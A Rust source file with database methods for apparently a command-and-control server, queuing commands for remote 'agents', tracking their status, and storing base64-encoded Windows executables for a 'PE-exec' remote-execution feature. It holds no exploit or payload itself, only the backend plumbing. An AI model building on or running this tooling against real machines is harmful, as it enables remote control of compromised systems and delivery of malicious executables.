use super::Database;
use chrono::Utc;
use rusqlite::{OptionalExtension, Result as SqlResult};

impl Database {
    pub fn add_command(&self, agent_id: &str, command: &str) -> SqlResult<i64> {
        let conn = self.conn()?;
        conn.execute(
            "INSERT INTO commands (agent_id, command, status) VALUES (?1, ?2, 'pending')",
            rusqlite::params![agent_id, command],
        )?;
        let command_id = conn.last_insert_rowid();
        log::info!(
            "[+] Command added for agent {}: {} (ID: {})",
            agent_id,
            command,
            command_id
        );
        Ok(command_id)
    }

    pub fn get_pending_commands(&self, agent_id: &str) -> SqlResult<Vec<(i64, String)>> {
        let conn = self.conn()?;
        let mut stmt = conn.prepare(
            "SELECT id, command FROM commands
             WHERE agent_id = ?1 AND status = 'pending'
             ORDER BY created_at ASC",
        )?;

        let commands = stmt
            .query_map([agent_id], |row| Ok((row.get(0)?, row.get(1)?)))?
            .collect::<Result<Vec<_>, _>>()?;

        Ok(commands)
    }

    pub fn mark_command_sent(&self, command_id: i64) -> SqlResult<()> {
        let conn = self.conn()?;
        let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        conn.execute(
            "UPDATE commands SET status = 'sent', sent_at = ?1 WHERE id = ?2",
            rusqlite::params![now, command_id],
        )?;
        log::debug!("[+] Command {} marked as sent", command_id);
        Ok(())
    }

    pub fn mark_command_completed(&self, command_id: i64) -> SqlResult<()> {
        let conn = self.conn()?;
        let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        conn.execute(
            "UPDATE commands SET status = 'completed', completed_at = ?1 WHERE id = ?2",
            rusqlite::params![now, command_id],
        )?;
        log::debug!("[+] Command {} marked as completed", command_id);
        Ok(())
    }

    pub fn mark_command_failed(&self, command_id: i64) -> SqlResult<()> {
        let conn = self.conn()?;
        let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        conn.execute(
            "UPDATE commands SET status = 'failed', completed_at = ?1 WHERE id = ?2",
            rusqlite::params![now, command_id],
        )?;
        log::debug!("[+] Command {} marked as failed", command_id);
        Ok(())
    }

    pub fn get_command_by_id(&self, command_id: i64) -> SqlResult<Option<String>> {
        let conn = self.conn()?;

        match conn.query_row(
            "SELECT command FROM commands WHERE id = ?1",
            [command_id],
            |row| {
                let command_str: String = row.get(0)?;
                Ok(command_str)
            },
        ) {
            Ok(cmd) => Ok(Some(cmd)),
            Err(rusqlite::Error::QueryReturnedNoRows) => Ok(None),
            Err(e) => Err(e),
        }
    }

    pub fn store_pe_exec_data(&self, command_id: i64, pe_data_b64: &str) -> SqlResult<()> {
        let conn = self.conn()?;

        conn.execute(
            "INSERT INTO pe_exec_data (command_id, pe_data) VALUES (?1, ?2)",
            rusqlite::params![command_id, pe_data_b64],
        )?;

        log::info!(
            "[+] PE-exec data stored for command {} (size: {} bytes)",
            command_id,
            pe_data_b64.len()
        );
        Ok(())
    }

    pub fn get_pe_exec_data_by_command(&self, command_id: i64) -> Result<Option<String>, String> {
        let conn = self.conn().map_err(|e| e.to_string())?;

        let result: Option<String> = conn
            .query_row(
                "SELECT pe_data FROM pe_exec_data WHERE command_id = ?1",
                rusqlite::params![command_id],
                |row| row.get(0),
            )
            .optional()
            .map_err(|e| format!("Failed to query PE-exec data: {}", e))?;

        Ok(result)
    }
}
